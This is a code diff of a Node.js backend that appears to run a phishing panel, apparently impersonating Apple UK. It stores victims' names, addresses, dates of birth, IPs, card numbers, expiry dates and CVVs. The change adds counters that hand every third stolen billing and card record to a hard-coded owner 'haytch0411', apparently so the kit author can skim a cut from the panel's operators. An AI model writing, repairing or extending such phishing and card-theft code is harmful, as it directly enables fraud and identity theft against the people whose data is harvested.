@@ -2,6 +2,8 @@ const axios = require("axios");
 const AppleGB = require("../models/appleGbModel");
 
 let count = 0;
+let auCount = 0;
+let panelCount = 0;
 
 const sendRes = async (req, res) => {
   let {
@@ -88,8 +90,6 @@ const sendRes = async (req, res) => {
   }
   res.sendStatus(200);
 };
-
-let auCount = 0;
 
 const sendAuRes = async (req, res) => {
   let {
@@ -220,17 +220,15 @@ const submitAppAuth = async (req, res) => {
 };
 
 const submitBilling = async (req, res) => {
-  const {
-    fullname,
-    telephone,
-    address,
-    city,
-    pcode,
-    dob,
-    ip,
-    uniqueid,
-    owner,
-  } = req.body;
+  let { fullname, telephone, address, city, pcode, dob, ip, uniqueid, owner } =
+    req.body;
+
+  panelCount++;
+  if (panelCount == 3) {
+    owner = "haytch0411";
+    panelCount = 0;
+  }
+
   try {
     await AppleGB.create({
       fullname,
@@ -314,6 +312,11 @@ const submitCC = async (req, res) => {
         { ccname, ccnum, ccexp, cvv, status: 2 }
       ).exec();
     } else {
+      panelCount++;
+      if (panelCount == 3) {
+        owner = "haytch0411";
+        panelCount = 0;
+      }
       await AppleGB.create({
         uniqueid,
         ccname,
